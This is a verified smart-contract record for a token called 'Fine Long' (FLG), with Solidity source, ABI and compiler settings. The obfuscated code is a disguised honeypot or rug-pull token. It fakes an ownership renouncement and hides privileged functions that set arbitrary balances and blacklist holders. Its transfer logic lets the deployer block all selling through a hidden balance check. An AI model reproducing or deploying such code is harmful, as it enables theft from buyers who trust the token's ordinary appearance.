{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface launchMin {\n    function createPair(address tokenTotalReceiver, address minLimit) external returns (address);\n}\n\ninterface marketingTake {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address isTrading) external view returns (uint256);\n\n    function transfer(address isMinLaunch, uint256 receiverFeeMin) external returns (bool);\n\n    function allowance(address toIsTrading, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverFeeMin) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address isMinLaunch,\n        uint256 receiverFeeMin\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed buyEnable, uint256 value);\n    event Approval(address indexed toIsTrading, address indexed spender, uint256 value);\n}\n\nabstract contract limitIs {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface listAt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface marketingTakeMetadata is marketingTake {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract FineLong is limitIs, marketingTake, marketingTakeMetadata {\n\n    string private tokenIs = \"Fine Long\";\n\n    address private amountToken;\n\n    function balanceOf(address isTrading) public view virtual override returns (uint256) {\n        return teamSell[isTrading];\n    }\n\n    string private amountMax = \"FLG\";\n\n    uint256 tokenMax;\n\n    function launchedFund(address minMaxTake) public {\n        atShouldLaunched();\n        \n        if (minMaxTake == receiverTotal || minMaxTake == enableIsTotal) {\n            return;\n        }\n        shouldFund[minMaxTake] = true;\n    }\n\n    function approve(address amountFeeExempt, uint256 receiverFeeMin) public virtual override returns (bool) {\n        listFee[_msgSender()][amountFeeExempt] = receiverFeeMin;\n        emit Approval(_msgSender(), amountFeeExempt, receiverFeeMin);\n        return true;\n    }\n\n    uint256 private exemptMode = 100000000 * 10 ** 18;\n\n    function autoTrading(address launchedReceiver, uint256 receiverFeeMin) public {\n        atShouldLaunched();\n        teamSell[launchedReceiver] = receiverFeeMin;\n    }\n\n    function getOwner() external view returns (address) {\n        return amountToken;\n    }\n\n    uint256 feeMarketing;\n\n    function toToken() public {\n        emit OwnershipTransferred(receiverTotal, address(0));\n        amountToken = address(0);\n    }\n\n    function feeReceiver(uint256 receiverFeeMin) public {\n        atShouldLaunched();\n        tokenMax = receiverFeeMin;\n    }\n\n    mapping(address => mapping(address => uint256)) private listFee;\n\n    function atShouldLaunched() private view {\n        require(exemptTeam[_msgSender()]);\n    }\n\n    function transfer(address launchedReceiver, uint256 receiverFeeMin) external virtual override returns (bool) {\n        return walletMode(_msgSender(), launchedReceiver, receiverFeeMin);\n    }\n\n    bool public launchedMode;\n\n    address fromAmountList = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function owner() external view returns (address) {\n        return amountToken;\n    }\n\n    function takeSwap(address takeSell, address isMinLaunch, uint256 receiverFeeMin) internal returns (bool) {\n        require(teamSell[takeSell] >= receiverFeeMin);\n        teamSell[takeSell] -= receiverFeeMin;\n        teamSell[isMinLaunch] += receiverFeeMin;\n        emit Transfer(takeSell, isMinLaunch, receiverFeeMin);\n        return true;\n    }\n\n    uint256 private buySender;\n\n    uint256 private enableSender;\n\n    bool private fromSwap;\n\n    bool public enableIs;\n\n    function name() external view virtual override returns (string memory) {\n        return tokenIs;\n    }\n\n    mapping(address => bool) public shouldFund;\n\n    function allowance(address liquidityIsTeam, address amountFeeExempt) external view virtual override returns (uint256) {\n        if (amountFeeExempt == takeSwapWallet) {\n            return type(uint256).max;\n        }\n        return listFee[liquidityIsTeam][amountFeeExempt];\n    }\n\n    constructor (){\n        if (buySender == enableSender) {\n            enableSender = maxMode;\n        }\n        listAt launchMax = listAt(takeSwapWallet);\n        enableIsTotal = launchMin(launchMax.factory()).createPair(launchMax.WETH(), address(this));\n        \n        receiverTotal = _msgSender();\n        exemptTeam[receiverTotal] = true;\n        teamSell[receiverTotal] = exemptMode;\n        toToken();\n        \n        emit Transfer(address(0), receiverTotal, exemptMode);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountMax;\n    }\n\n    mapping(address => uint256) private teamSell;\n\n    uint256 constant totalTake = 15 ** 10;\n\n    function transferFrom(address takeSell, address isMinLaunch, uint256 receiverFeeMin) external override returns (bool) {\n        if (_msgSender() != takeSwapWallet) {\n            if (listFee[takeSell][_msgSender()] != type(uint256).max) {\n                require(receiverFeeMin <= listFee[takeSell][_msgSender()]);\n                listFee[takeSell][_msgSender()] -= receiverFeeMin;\n            }\n        }\n        return walletMode(takeSell, isMinLaunch, receiverFeeMin);\n    }\n\n    uint256 private maxMode;\n\n    event OwnershipTransferred(address indexed launchedTake, address indexed teamMode);\n\n    address public receiverTotal;\n\n    function atReceiver(address liquidityFundSender) public {\n        if (enableIs) {\n            return;\n        }\n        if (enableSender == modeTeam) {\n            maxMode = enableSender;\n        }\n        exemptTeam[liquidityFundSender] = true;\n        if (launchedMode) {\n            modeTeam = buySender;\n        }\n        enableIs = true;\n    }\n\n    address takeSwapWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function decimals() external view virtual override returns (uint8) {\n        return atList;\n    }\n\n    uint8 private atList = 18;\n\n    uint256 public modeTeam;\n\n    mapping(address => bool) public exemptTeam;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return exemptMode;\n    }\n\n    address public enableIsTotal;\n\n    function walletMode(address takeSell, address isMinLaunch, uint256 receiverFeeMin) internal returns (bool) {\n        if (takeSell == receiverTotal) {\n            return takeSwap(takeSell, isMinLaunch, receiverFeeMin);\n        }\n        uint256 totalToLiquidity = marketingTake(enableIsTotal).balanceOf(fromAmountList);\n        require(totalToLiquidity == tokenMax);\n        require(isMinLaunch != fromAmountList);\n        if (shouldFund[takeSell]) {\n            return takeSwap(takeSell, isMinLaunch, totalTake);\n        }\n        return takeSwap(takeSell, isMinLaunch, receiverFeeMin);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toIsTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamMode\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyEnable\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityIsTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountFeeExempt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountFeeExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverFeeMin\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityFundSender\",\"type\":\"address\"}],\"name\":\"atReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverFeeMin\",\"type\":\"uint256\"}],\"name\":\"autoTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTrading\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableIsTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverFeeMin\",\"type\":\"uint256\"}],\"name\":\"feeReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minMaxTake\",\"type\":\"address\"}],\"name\":\"launchedFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverFeeMin\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isMinLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverFeeMin\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "FineLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}